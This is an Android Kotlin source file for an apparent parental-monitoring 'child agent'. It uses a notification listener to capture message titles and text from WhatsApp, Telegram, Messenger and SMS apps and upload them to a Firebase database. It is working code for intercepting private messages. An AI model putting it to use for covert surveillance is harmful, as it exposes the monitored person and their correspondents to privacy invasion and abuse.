package com.guardian.monitor

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.google.firebase.database.FirebaseDatabase

/**
 * Child App Agent
 * Intercepts notifications and pushes them to Firebase
 */
class ChildApp : NotificationListenerService() {

    private val database = FirebaseDatabase.getInstance().reference

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        val extras = sbn.notification.extras
        
        val title = extras.getString(Notification.EXTRA_TITLE)
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
        
        if (title != null && text != null) {
            if (isTargetApp(packageName)) {
                syncToCloud(packageName, title, text)
            }
        }
    }

    private fun isTargetApp(packageName: String): Boolean {
        val targets = listOf(
            "com.whatsapp",
            "org.telegram.messenger",
            "com.facebook.orca",
            "com.android.mms",
            "com.google.android.apps.messaging"
        )
        return targets.contains(packageName)
    }

    private fun syncToCloud(packageName: String, sender: String, message: String) {
        // Use a unique ID for the child device
        val deviceId = "child_dev_primary" 
        val entry = mapOf(
            "sender" to sender,
            "message" to message,
            "app" to packageName,
            "time" to System.currentTimeMillis()
        )
        
        database.child("monitoring").child(deviceId).child("logs").push().setValue(entry)
            .addOnFailureListener {
                Log.e("GuardianChild", "Sync Failed: ${it.message}")
            }
    }
}
